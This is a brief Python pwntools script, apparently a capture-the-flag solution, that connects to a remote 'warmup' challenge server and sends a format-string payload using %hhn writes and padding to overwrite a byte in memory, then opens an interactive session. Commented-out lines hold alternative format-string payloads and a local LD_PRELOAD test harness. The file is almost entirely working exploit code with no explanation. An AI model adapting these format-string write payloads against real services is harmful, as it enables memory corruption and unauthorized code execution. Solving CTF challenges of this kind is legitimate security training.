from pwn import *

#while True:
#io = process("./bac",env={"LD_PRELOAD":"./libc.so.6"})
io = remote("warmup.ctf.defenit.kr",3333)
#gdb.attach(io)
payload ="%18964x"+"%12$hhnaa"+"a"*48+"\x38"#"%3019079x"+"%14$n"+"a"*66 + "\x48\xbf"#"%*78$d"+"%17nn"+"a"*117+ "\x48\xcc"

io.send(payload)
io.interactive()
 #   break
